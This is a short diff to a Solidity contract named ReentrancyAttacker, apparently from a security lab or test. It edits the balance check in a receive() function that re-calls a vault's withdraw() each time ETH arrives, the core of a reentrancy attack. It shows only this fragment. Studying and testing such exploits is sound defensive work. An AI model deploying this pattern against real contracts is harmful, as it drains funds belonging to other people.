@@ -20,7 +20,7 @@ contract ReentrancyAttacker {
 
     // When vault sends ETH here, this code intercepts it and calls withdraw AGAIN.
     receive() external payable {
-        if (address(targetVault).balance >= 1 ether) {
+        if (address(targetVault).balance > 1 ether) {
             targetVault.withdraw();
         }
     }
